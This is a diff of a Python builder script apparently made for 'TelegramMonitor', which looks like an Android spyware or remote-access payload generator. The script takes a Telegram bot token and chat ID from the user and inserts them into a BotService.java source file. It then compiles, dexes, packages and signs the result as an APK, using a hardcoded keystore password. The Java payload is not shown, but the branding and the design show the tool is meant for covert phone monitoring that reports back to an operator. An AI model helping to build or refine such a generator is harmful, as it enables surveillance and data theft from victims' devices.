@@ -1,20 +1,14 @@
-# Full TelegramMonitor Builder Structure Setup with Main Menu
-# This script assumes you've already placed all the necessary Java files
-# and structure correctly in your TelegramMonitor-Builder directory
-
 import os
 import time
 import webbrowser
 from getpass import getpass
 
 # Global Config
-REPO_PATH = "TelegramMonitor-Builder"
-JAVA_SRC = f"{REPO_PATH}/java"
-BIN_PATH = f"{REPO_PATH}/bin"
-APK_OUTPUT = f"{REPO_PATH}/TelegramMonitor.apk"
+JAVA_SRC = "java"
+BIN_PATH = "bin"
+APK_OUTPUT = "TelegramMonitor.apk"
 PACKAGE_NAME = "com.nehal.telegrammonitor"
 MAIN_ACTIVITY = "com.nehal.telegrammonitor.MainActivity"
-
 
 def play_sound():
     try:
@@ -22,14 +16,12 @@ def play_sound():
     except:
         pass
 
-
 def animate_start():
     play_sound()
     for i in range(3):
         print("\033[1;32m[+] Loading Tool" + "." * (i + 1) + "\033[0m")
         time.sleep(1)
     os.system("clear")
-
 
 def banner():
     os.system("clear")
@@ -41,13 +33,11 @@ def banner():
     print("INSTA: nehal_dark_trap")
     print("=============================\033[0m")
 
-
 def open_link(url):
     try:
         os.system(f"xdg-open '{url}' > /dev/null 2>&1 &")
     except:
         webbrowser.open(url)
-
 
 def subscription_lock():
     while True:
@@ -71,36 +61,36 @@ def subscription_lock():
             print("❌ Invalid choice. Try again.")
             time.sleep(1)
 
-
 def compile_java():
     os.makedirs(BIN_PATH, exist_ok=True)
     print("\n⚙️ Compiling Java files...")
     os.system(f"ecj -sourcepath {JAVA_SRC} -d {BIN_PATH} {JAVA_SRC}/com/nehal/telegrammonitor/*.java")
 
-
 def convert_dex():
     print("⚙️ Converting to DEX format...")
-    os.system(f"dx --dex --output={REPO_PATH}/classes.dex {BIN_PATH}")
-
+    os.system(f"dx --dex --output=classes.dex {BIN_PATH}")
 
 def build_apk():
     print("⚙️ Building unsigned APK...")
-    os.system(f"aapt package -f -M {REPO_PATH}/AndroidManifest.xml -S {REPO_PATH}/res -I $PREFIX/share/aapt/android.jar -F {REPO_PATH}/unsigned.apk {BIN_PATH}")
-    os.system(f"aapt add {REPO_PATH}/unsigned.apk {REPO_PATH}/classes.dex")
+    os.system(f"aapt package -f -M AndroidManifest.xml -S res -I $PREFIX/share/aapt/android.jar -F unsigned.apk {BIN_PATH}")
+    os.system("aapt add unsigned.apk classes.dex")
     print("🔐 Signing APK...")
-    os.system(f"apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --key-pass pass:123456 --out {APK_OUTPUT} {REPO_PATH}/unsigned.apk")
+    os.system("apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --key-pass pass:123456 --out TelegramMonitor.apk unsigned.apk")
     print(f"✅ APK Build Complete: {APK_OUTPUT}")
-
 
 def build_menu():
     token = input("\n🔐 Enter your Telegram Bot Token: ")
     chat_id = input("🆔 Enter your Telegram Chat ID: ")
 
     bot_file = f"{JAVA_SRC}/com/nehal/telegrammonitor/BotService.java"
+    if not os.path.exists(bot_file):
+        print(f"❌ ERROR: BotService.java not found at: {bot_file}")
+        return
+
     with open(bot_file, "r") as f:
         content = f.read()
 
-    # Replace placeholders with user values
+    # Replace placeholders
     content = content.replace("YOUR_BOT_TOKEN_HERE", token)
     content = content.replace("YOUR_CHAT_ID_HERE", chat_id)
 
@@ -110,7 +100,6 @@ def build_menu():
     compile_java()
     convert_dex()
     build_apk()
-
 
 def main_menu():
     while True:
@@ -129,7 +118,6 @@ def main_menu():
         else:
             print("\n❌ Invalid choice!")
         input("\n🔁 Press Enter to return to menu...")
-
 
 if __name__ == '__main__':
     animate_start()
